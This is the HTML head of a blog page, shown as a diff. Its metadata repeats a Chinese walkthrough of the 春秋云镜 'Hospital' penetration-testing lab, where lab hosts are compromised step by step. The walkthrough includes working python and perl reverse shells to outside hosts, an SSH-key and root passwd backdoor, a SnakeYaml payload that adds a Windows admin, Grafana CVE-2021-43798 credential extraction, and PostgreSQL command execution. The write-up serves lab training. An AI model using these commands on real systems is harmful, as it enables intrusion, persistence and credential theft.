@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<meta name="generator" content="Hugo 0.135.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="toTop" content="true">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="author" content="" />
+<meta property="og:url" content="https://w0s1np.github.io/blog/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-hospital.html/" />
+<link rel="canonical" href="https://w0s1np.github.io/blog/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-hospital.html/" /><link rel="apple-touch-icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="icon" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+<link rel="shortcut" href="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" /><link rel="alternate" type="application/atom+xml" href="https://w0s1np.github.io/index.xml" title="末流双非的救赎之道">
+<script type="application/ld+json">
+{
+"@context" : "http://schema.org",
+"@type" : "BlogPosting",
+"mainEntityOfPage": {
+"@type": "WebPage",
+"@id": "https:\/\/w0s1np.github.io\/"
+},
+"articleSection" : "blog",
+"name" : "春秋云镜 Hospital",
+"headline" : "春秋云镜 Hospital",
+"description" : "在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。\nweb1 Spring Boot Heapdump \u002b Shiro Deserialization fscan\n.\/fscan -h 39.101.142.149 开放了8080端口，是一个shiro框架，并且有heapdump泄漏\n访问\/actuator\n用工具分析一下 heapdump 文件，使用 whwlsfb\/JDumpSpider 分析 heapdump 文件，将自动查找 \/actuator\/env 中的 * 内容进行显示\n拿到密钥用 shiro 的工具爆破一下利用链\njdk_1.8_202\n打个 behinder，看看有没有 suid 提权\n\/home\/app\/ \u0026gt;whoami app \/home\/app\/ \u0026gt;find \/ -perm -u=s -type f 2\u0026gt;\/dev\/null \/usr\/bin\/vim.basic \/usr\/bin\/su \/usr\/bin\/newgrp \/usr\/bin\/staprun \/usr\/bin\/at \/usr\/bin\/passwd \/usr\/bin\/gpasswd \/usr\/bin\/umount \/usr\/bin\/chfn \/usr\/bin\/stapbpf \/usr\/bin\/sudo \/usr\/bin\/chsh \/usr\/bin\/fusermount \/usr\/bin\/mount \/usr\/lib\/openssh\/ssh-keysign \/usr\/lib\/dbus-1.0\/dbus-daemon-launch-helper \/usr\/lib\/eject\/dmcrypt-get-device vim.basic 拥有 suid 权限，这个就相当于我们可以以 root 的身份编辑文件了，可以尝试写 ssh 的 authorized_keys，反弹shell：\npython3 -c \u0026#39;import os,pty,socket;s=socket.socket();s.connect((\u0026#34;47.110.124.239\u0026#34;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; 继续升级到交互式shell python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;\/bin\/bash\u0026#39;)\u0026#34; 写入 ssh 或者新增用户\nssh-keygen -t rsa -f ~\/.ssh\/sshdoor # 生成公私钥 vim.basic \/root\/.ssh\/authorized_keys chmod 600 \/root\/.ssh\/authorized_keys chmod 700 \/root\/.ssh ssh -i sshdoor root@172.30.12.236 # ～\/.ssh :1,$d清除所有内容，:i进入编辑模式，写入后wq!强制保存\n或者写系统账号密码\n生成密码：用 openssl passwd -1 -salt 123 123456（这里是-1（数字1）不是L） $1$123$7mft0jKnzzvAdU4t0unTG1 直接写在passwd文件里面 vim.basic \/etc\/passwd hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:\/root:\/bin\/bash su hacker # 密码123456 # whoami whoami hacker # ls \/root\/flag ls \/root\/flag flag01.txt web2 Nacos Client Yaml Deserialization 上传 fscan\n172.30.12.6:8848 open 172.30.12.236:22 open 172.30.12.5:22 open 172.30.12.236:8080 open 172.30.12.5:8080 open 172.30.12.6:445 open 172.30.12.6:139 open 172.30.12.6:135 open 172.30.12.236:8009 open [*] alive ports len is: 9 start vulscan [*] NetInfo [*]172.30.12.6 [-\u0026gt;]Server02 [-\u0026gt;]172.30.12.6 [*] NetBios 172.30.12.6 WORKGROUP\\SERVER02 [*] WebTitle http:\/\/172.30.12.5:8080 code:302 len:0 title:None 跳转url: http:\/\/172.30.12.5:8080\/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 [*] WebTitle http:\/\/172.30.12.5:8080\/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 code:200 len:2005 title:医疗管理后台 [*] WebTitle http:\/\/172.30.12.236:8080 code:200 len:3964 title:医院后台管理平台 [*] WebTitle http:\/\/172.30.12.6:8848 code:404 len:431 title:HTTP Status 404 – Not Found [\u002b] PocScan http:\/\/172.30.12.6:8848 poc-yaml-alibaba-nacos [\u002b] PocScan http:\/\/172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [\u002b] PocScan http:\/\/172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 内网的172.30.12.6:8848是 Nacos，发现一个 nacos 并且存在未授权添加用户的漏洞。，配置代理后访问\n靶机一：\n.\/linux_x64_agent -l 9999 -s 123 本机：\n.\/mac_admin -c 靶机一ip:9999 -s 123 use 0 socks 7777 可以打SnakeYaml，编译恶意 payload，参考项目：https:\/\/github.com\/artsploit\/yaml-payload\n只需要修改 AwesomeScriptEngineFactory.java 的内容，由于目标是 windows 机器，所以可以添加个帐号，目标服务器也开了 3389 端口\npublic AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\u0026#34;net user h0ny Admin123AKB48 \/add\u0026#34;); Runtime.getRuntime().exec(\u0026#34;net localgroup administrators h0ny \/add\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } 然后用java1.8 的版本去编译，这里用的jdk1.8_202\njavac src\/artsploit\/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src\/ . 访问 nacos 应用[http:\/\/172.30.12.6:8848](http:\/\/172.30.12.6:8848\/)\/nacos\/,读配置文件\nserver: port: 8080 servlet: context-path: \/hello spring: application: name: db-config cloud: nacos: discovery: server-addr: 127.0.0.1:8848 config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: dev group: DEFAULT_GROUP data-id: db-config.yaml datasource: mysql: url: jdbc:mysql:\/\/localhost:3306\/test?useSSL=false\u0026amp;serverTimezone=UTC\u0026amp;allowPublicKeyRetrieval=true username: root password: P@ssWord!!! redis: host: localhost port: 6379 management: endpoints: web: exposure: include: \u0026#39;*\u0026#39; 将恶意的 yaml-payload.jar 包上传至 web01 主机上，并开启一个 http 服务：\nroot@web01:~# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http:\/\/0.0.0.0:80\/) ... 172.30.12.6 - - [29\/Dec\/2023 14:52:42] \u0026#34;GET \/yaml-payload.jar HTTP\/1.1\u0026#34; 200 - 下一个charonlight\/NacosExploitGUI,让 nacos 服务器去从远程服务器加载恶意的 yaml-payload.jar 包：\n远程桌面登录 nacos 主机，查看 flag02：\nweb3 fastjson 医院后台管理平台：http:\/\/172.30.12.236:8080\/\n使用 burp 插件 amaz1ngday\/fastjson-exp 直接注入内存马：\nLinux 双网卡主机：\nroot@web03:~# ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.30.12.236 netmask 255.255.0.0 broadcast 172.30.255.255 inet6 fe80::216:3eff:fe13:6b80 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:16:3e:13:6b:80 txqueuelen 1000 (Ethernet) RX packets 148468 bytes 58106819 (58.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 117490 bytes 20492549 (20.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.30.54.179 netmask 255.255.255.0 broadcast 172.30.54.255 inet6 fe80::216:3eff:fe00:e608 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:16:3e:00:e6:08 txqueuelen 1000 (Ethernet) RX packets 5221 bytes 2442441 (2.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4640 bytes 1419394 (1.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 2446 bytes 208088 (208.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2446 bytes 208088 (208.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 配置代理：\n靶机二：\n.\/linux_x64_agent -c 靶机一ip:8888 -s 123 本机：\n(node 0) \u0026gt;\u0026gt; listen [*] Please choose the mode(1.Normal passive\/2.IPTables Reuse\/3.SOReuse): 1 [*] Please input the [ip:]\u0026lt;port\u0026gt; : 8888 [*] Node is listening on 8888 (node 0) \u0026gt;\u0026gt; [*] New node come! Node id is 1 (node 0) \u0026gt;\u0026gt; back (admin) \u0026gt;\u0026gt; detail Node[0] -\u0026gt; IP: 39.101.163.3:9999 Hostname: web01 User: hacker Node[1] -\u0026gt; IP: 172.30.12.236:53536 Hostname: web03 User: root use 1 socks 6666 web4 Grafana 需要利用 CVE-2021-43798 漏洞获取到数据库文件（\/var\/lib\/grafana\/grafana.db）以及存在解密密钥的配置文件（\/etc\/grafana\/grafana.ini），然后进行解密。\n使用 A-D-Team\/grafanaExp 可以一键利用漏洞解密输出 data_souce 信息：\nroot@web03:~# .\/grafanaExp_linux_amd64 exp -u http:\/\/172.30.54.12:3000 2023\/12\/29 17:41:34 Target vulnerable has plugin [alertlist] 2023\/12\/29 17:41:34 Got secret_key [SW2YcwTIb9zpOOhoPsMm] 2023\/12\/29 17:41:34 There is [0] records in db. 2023\/12\/29 17:41:34 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123]database:[postgres] basic_auth_user:[] basic_auth_password:[] 2023\/12\/29 17:41:34 All Done, have nice day! 使用账号密码 postgres:Postgres@123 登录 PostgreSQL 数据库：\nroot@kali-server:~# export PGPASSWORD=Postgres@123 root@kali-server:~# proxychains4 -q psql -h 172.30.54.12 -U postgres -W psql (16.1 (Debian 16.1-1), server 8.1.0) WARNING: psql major version 16, server major version 8.1. Some psql features might not work. Type \u0026#34;help\u0026#34; for help. postgres=# select version(); version --------------------------------------------------------------------------------------------------------- PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 (1 row) postgres=# SHOW is_superuser; is_superuser -------------- on (1 row) postgres=# select usename, passwd from pg_shadow; usename | passwd ----------\u002b------------------------------------- root | md5da974531914a7c2c56df745574a5bd3a postgres | md5dd27d33705155fd675e498384ad3d2ea (2 rows) postgres=# SELECT name,setting,source FROM pg_settings WHERE name = \u0026#39;password_encryption\u0026#39;; name | setting | source ---------------------\u002b---------\u002b--------- password_encryption | on | default (1 row) PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件：\npostgres=# CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS \u0026#39;\/lib\/x86_64-linux-gnu\/libc.so.6\u0026#39;, \u0026#39;system\u0026#39; LANGUAGE \u0026#39;c\u0026#39; STRICT; postgres=# select system(\u0026#39;curl 172.30.54.179\u0026#39;); system -------- 0 (1 row) postgres=# select system(\u0026#39;perl -e \\\u0026#39;use Socket;$i=\u0026#34;172.30.54.179\u0026#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;\/bin\/sh -i\u0026#34;);};\\\u0026#39;\u0026#39;); system -------- 512 (1 row) 这里还需要给postgresql的root用户进行修改密码的操作，为了方便后面提权\nALTER USER root WITH PASSWORD \u0026#39;123456\u0026#39;; 我先在web3写了个ssh后门，然后通过nc监听：\nnc -lvp 2333 -s 172.30.54.179 Listening on web03 2333 Connection received on 172.30.54.12 56402 \/bin\/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;\/bin\/bash\u0026#34;)\u0026#39; postgres@web04:\/usr\/local\/pgsql\/data$ sudo -l sudo -l Matching Defaults entries for postgres on web04: env_reset, mail_badpass, secure_path=\/usr\/local\/sbin\\:\/usr\/local\/bin\\:\/usr\/sbin\\:\/usr\/bin\\:\/sbin\\:\/bin\\:\/snap\/bin 这里有坑，一：需要输入刚才的 root 的密码，二：需要把得到的shel升为交互式shell：\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;\/bin\/bash\u0026#39;)\u0026#34; 通过sudo -l 提权：https:\/\/gtfobins.github.io\/gtfobins\/psql\/\npsql \\? !\/bin\/sh ",
+"inLanguage" : "en-US",
+"author" : "",
+"creator" : "",
+"publisher": "",
+"accountablePerson" : "",
+"copyrightHolder" : "",
+"copyrightYear" : "2024",
+"datePublished": "2024-10-25 15:13:48 \u002b0800 CST",
+"dateModified" : "2024-10-25 15:13:48 \u002b0800 CST",
+"url" : "https:\/\/w0s1np.github.io\/blog\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-hospital.html\/",
+"keywords" : [ "Pentest", ]
+}
+</script><title>春秋云镜 Hospital - 末流双非的救赎之道</title>
+<meta property="og:title" content="春秋云镜 Hospital" />
+<meta property="og:type" content="article" />
+<meta property="og:description" content="在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。
+web1 Spring Boot Heapdump &#43; Shiro Deserialization fscan
+./fscan -h 39.101.142.149 开放了8080端口，是一个shiro框架，并且有heapdump泄漏
+访问/actuator
+用工具分析一下 heapdump 文件，使用 whwlsfb/JDumpSpider 分析 heapdump 文件，将自动查找 /actuator/env 中的 * 内容进行显示
+拿到密钥用 shiro 的工具爆破一下利用链
+jdk_1.8_202
+打个 behinder，看看有没有 suid 提权
+/home/app/ &gt;whoami app /home/app/ &gt;find / -perm -u=s -type f 2&gt;/dev/null /usr/bin/vim.basic /usr/bin/su /usr/bin/newgrp /usr/bin/staprun /usr/bin/at /usr/bin/passwd /usr/bin/gpasswd /usr/bin/umount /usr/bin/chfn /usr/bin/stapbpf /usr/bin/sudo /usr/bin/chsh /usr/bin/fusermount /usr/bin/mount /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device vim.basic 拥有 suid 权限，这个就相当于我们可以以 root 的身份编辑文件了，可以尝试写 ssh 的 authorized_keys，反弹shell：
+python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&#34;47.110.124.239&#34;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39; 继续升级到交互式shell python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; 写入 ssh 或者新增用户
+ssh-keygen -t rsa -f ~/.ssh/sshdoor # 生成公私钥 vim.basic /root/.ssh/authorized_keys chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh ssh -i sshdoor root@172.30.12.236 # ～/.ssh :1,$d清除所有内容，:i进入编辑模式，写入后wq!强制保存
+或者写系统账号密码
+生成密码：用 openssl passwd -1 -salt 123 123456（这里是-1（数字1）不是L） $1$123$7mft0jKnzzvAdU4t0unTG1 直接写在passwd文件里面 vim.basic /etc/passwd hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash su hacker # 密码123456 # whoami whoami hacker # ls /root/flag ls /root/flag flag01.txt web2 Nacos Client Yaml Deserialization 上传 fscan
+172.30.12.6:8848 open 172.30.12.236:22 open 172.30.12.5:22 open 172.30.12.236:8080 open 172.30.12.5:8080 open 172.30.12.6:445 open 172.30.12.6:139 open 172.30.12.6:135 open 172.30.12.236:8009 open [*] alive ports len is: 9 start vulscan [*] NetInfo [*]172.30.12.6 [-&gt;]Server02 [-&gt;]172.30.12.6 [*] NetBios 172.30.12.6 WORKGROUP\SERVER02 [*] WebTitle http://172.30.12.5:8080 code:302 len:0 title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 [*] WebTitle http://172.30.12.5:8080/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 code:200 len:2005 title:医疗管理后台 [*] WebTitle http://172.30.12.236:8080 code:200 len:3964 title:医院后台管理平台 [*] WebTitle http://172.30.12.6:8848 code:404 len:431 title:HTTP Status 404 – Not Found [&#43;] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos [&#43;] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [&#43;] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 内网的172.30.12.6:8848是 Nacos，发现一个 nacos 并且存在未授权添加用户的漏洞。，配置代理后访问
+靶机一：
+./linux_x64_agent -l 9999 -s 123 本机：
+./mac_admin -c 靶机一ip:9999 -s 123 use 0 socks 7777 可以打SnakeYaml，编译恶意 payload，参考项目：https://github.com/artsploit/yaml-payload
+只需要修改 AwesomeScriptEngineFactory.java 的内容，由于目标是 windows 机器，所以可以添加个帐号，目标服务器也开了 3389 端口
+public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(&#34;net user h0ny Admin123AKB48 /add&#34;); Runtime.getRuntime().exec(&#34;net localgroup administrators h0ny /add&#34;); } catch (IOException e) { e.printStackTrace(); } } 然后用java1.8 的版本去编译，这里用的jdk1.8_202
+javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . 访问 nacos 应用[http://172.30.12.6:8848](http://172.30.12.6:8848/)/nacos/,读配置文件
+server: port: 8080 servlet: context-path: /hello spring: application: name: db-config cloud: nacos: discovery: server-addr: 127.0.0.1:8848 config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: dev group: DEFAULT_GROUP data-id: db-config.yaml datasource: mysql: url: jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true username: root password: P@ssWord!!! redis: host: localhost port: 6379 management: endpoints: web: exposure: include: &#39;*&#39; 将恶意的 yaml-payload.jar 包上传至 web01 主机上，并开启一个 http 服务：
+root@web01:~# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 172.30.12.6 - - [29/Dec/2023 14:52:42] &#34;GET /yaml-payload.jar HTTP/1.1&#34; 200 - 下一个charonlight/NacosExploitGUI,让 nacos 服务器去从远程服务器加载恶意的 yaml-payload.jar 包：
+远程桌面登录 nacos 主机，查看 flag02：
+web3 fastjson 医院后台管理平台：http://172.30.12.236:8080/
+使用 burp 插件 amaz1ngday/fastjson-exp 直接注入内存马：
+Linux 双网卡主机：
+root@web03:~# ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.30.12.236 netmask 255.255.0.0 broadcast 172.30.255.255 inet6 fe80::216:3eff:fe13:6b80 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:13:6b:80 txqueuelen 1000 (Ethernet) RX packets 148468 bytes 58106819 (58.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 117490 bytes 20492549 (20.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.30.54.179 netmask 255.255.255.0 broadcast 172.30.54.255 inet6 fe80::216:3eff:fe00:e608 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:00:e6:08 txqueuelen 1000 (Ethernet) RX packets 5221 bytes 2442441 (2.4 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 4640 bytes 1419394 (1.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 2446 bytes 208088 (208.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2446 bytes 208088 (208.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 配置代理：
+靶机二：
+./linux_x64_agent -c 靶机一ip:8888 -s 123 本机：
+(node 0) &gt;&gt; listen [*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1 [*] Please input the [ip:]&lt;port&gt; : 8888 [*] Node is listening on 8888 (node 0) &gt;&gt; [*] New node come! Node id is 1 (node 0) &gt;&gt; back (admin) &gt;&gt; detail Node[0] -&gt; IP: 39.101.163.3:9999 Hostname: web01 User: hacker Node[1] -&gt; IP: 172.30.12.236:53536 Hostname: web03 User: root use 1 socks 6666 web4 Grafana 需要利用 CVE-2021-43798 漏洞获取到数据库文件（/var/lib/grafana/grafana.db）以及存在解密密钥的配置文件（/etc/grafana/grafana.ini），然后进行解密。
+使用 A-D-Team/grafanaExp 可以一键利用漏洞解密输出 data_souce 信息：
+root@web03:~# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000 2023/12/29 17:41:34 Target vulnerable has plugin [alertlist] 2023/12/29 17:41:34 Got secret_key [SW2YcwTIb9zpOOhoPsMm] 2023/12/29 17:41:34 There is [0] records in db. 2023/12/29 17:41:34 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123]database:[postgres] basic_auth_user:[] basic_auth_password:[] 2023/12/29 17:41:34 All Done, have nice day! 使用账号密码 postgres:Postgres@123 登录 PostgreSQL 数据库：
+root@kali-server:~# export PGPASSWORD=Postgres@123 root@kali-server:~# proxychains4 -q psql -h 172.30.54.12 -U postgres -W psql (16.1 (Debian 16.1-1), server 8.1.0) WARNING: psql major version 16, server major version 8.1. Some psql features might not work. Type &#34;help&#34; for help. postgres=# select version(); version --------------------------------------------------------------------------------------------------------- PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 (1 row) postgres=# SHOW is_superuser; is_superuser -------------- on (1 row) postgres=# select usename, passwd from pg_shadow; usename | passwd ----------&#43;------------------------------------- root | md5da974531914a7c2c56df745574a5bd3a postgres | md5dd27d33705155fd675e498384ad3d2ea (2 rows) postgres=# SELECT name,setting,source FROM pg_settings WHERE name = &#39;password_encryption&#39;; name | setting | source ---------------------&#43;---------&#43;--------- password_encryption | on | default (1 row) PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件：
+postgres=# CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;, &#39;system&#39; LANGUAGE &#39;c&#39; STRICT; postgres=# select system(&#39;curl 172.30.54.179&#39;); system -------- 0 (1 row) postgres=# select system(&#39;perl -e \&#39;use Socket;$i=&#34;172.30.54.179&#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};\&#39;&#39;); system -------- 512 (1 row) 这里还需要给postgresql的root用户进行修改密码的操作，为了方便后面提权
+ALTER USER root WITH PASSWORD &#39;123456&#39;; 我先在web3写了个ssh后门，然后通过nc监听：
+nc -lvp 2333 -s 172.30.54.179 Listening on web03 2333 Connection received on 172.30.54.12 56402 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; postgres@web04:/usr/local/pgsql/data$ sudo -l sudo -l Matching Defaults entries for postgres on web04: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 这里有坑，一：需要输入刚才的 root 的密码，二：需要把得到的shel升为交互式shell：
+python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; 通过sudo -l 提权：https://gtfobins.github.io/gtfobins/psql/
+psql \? !/bin/sh " />
+<meta name="description" content="在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。
+web1 Spring Boot Heapdump &#43; Shiro Deserialization fscan
+./fscan -h 39.101.142.149 开放了8080端口，是一个shiro框架，并且有heapdump泄漏
+访问/actuator
+用工具分析一下 heapdump 文件，使用 whwlsfb/JDumpSpider 分析 heapdump 文件，将自动查找 /actuator/env 中的 * 内容进行显示
+拿到密钥用 shiro 的工具爆破一下利用链
+jdk_1.8_202
+打个 behinder，看看有没有 suid 提权
+/home/app/ &gt;whoami app /home/app/ &gt;find / -perm -u=s -type f 2&gt;/dev/null /usr/bin/vim.basic /usr/bin/su /usr/bin/newgrp /usr/bin/staprun /usr/bin/at /usr/bin/passwd /usr/bin/gpasswd /usr/bin/umount /usr/bin/chfn /usr/bin/stapbpf /usr/bin/sudo /usr/bin/chsh /usr/bin/fusermount /usr/bin/mount /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device vim.basic 拥有 suid 权限，这个就相当于我们可以以 root 的身份编辑文件了，可以尝试写 ssh 的 authorized_keys，反弹shell：
+python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&#34;47.110.124.239&#34;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39; 继续升级到交互式shell python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34; 写入 ssh 或者新增用户
+ssh-keygen -t rsa -f ~/.ssh/sshdoor # 生成公私钥 vim.basic /root/.ssh/authorized_keys chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh ssh -i sshdoor root@172.30.12.236 # ～/.ssh :1,$d清除所有内容，:i进入编辑模式，写入后wq!强制保存
+或者写系统账号密码
+生成密码：用 openssl passwd -1 -salt 123 123456（这里是-1（数字1）不是L） $1$123$7mft0jKnzzvAdU4t0unTG1 直接写在passwd文件里面 vim.basic /etc/passwd hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash su hacker # 密码123456 # whoami whoami hacker # ls /root/flag ls /root/flag flag01.txt web2 Nacos Client Yaml Deserialization 上传 fscan
+172.30.12.6:8848 open 172.30.12.236:22 open 172.30.12.5:22 open 172.30.12.236:8080 open 172.30.12.5:8080 open 172.30.12.6:445 open 172.30.12.6:139 open 172.30.12.6:135 open 172.30.12.236:8009 open [*] alive ports len is: 9 start vulscan [*] NetInfo [*]172.30.12.6 [-&gt;]Server02 [-&gt;]172.30.12.6 [*] NetBios 172.30.12.6 WORKGROUP\SERVER02 [*] WebTitle http://172.30.12.5:8080 code:302 len:0 title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 [*] WebTitle http://172.30.12.5:8080/login;jsessionid=6C4FB4BD34B554A1F4A994A901D7A329 code:200 len:2005 title:医疗管理后台 [*] WebTitle http://172.30.12.236:8080 code:200 len:3964 title:医院后台管理平台 [*] WebTitle http://172.30.12.6:8848 code:404 len:431 title:HTTP Status 404 – Not Found [&#43;] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos [&#43;] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [&#43;] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 内网的172.30.12.6:8848是 Nacos，发现一个 nacos 并且存在未授权添加用户的漏洞。，配置代理后访问
+靶机一：
+./linux_x64_agent -l 9999 -s 123 本机：
+./mac_admin -c 靶机一ip:9999 -s 123 use 0 socks 7777 可以打SnakeYaml，编译恶意 payload，参考项目：https://github.com/artsploit/yaml-payload
+只需要修改 AwesomeScriptEngineFactory.java 的内容，由于目标是 windows 机器，所以可以添加个帐号，目标服务器也开了 3389 端口
+public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(&#34;net user h0ny Admin123AKB48 /add&#34;); Runtime.getRuntime().exec(&#34;net localgroup administrators h0ny /add&#34;); } catch (IOException e) { e.printStackTrace(); } } 然后用java1.8 的版本去编译，这里用的jdk1.8_202
+javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . 访问 nacos 应用[http://172.30.12.6:8848](http://172.30.12.6:8848/)/nacos/,读配置文件
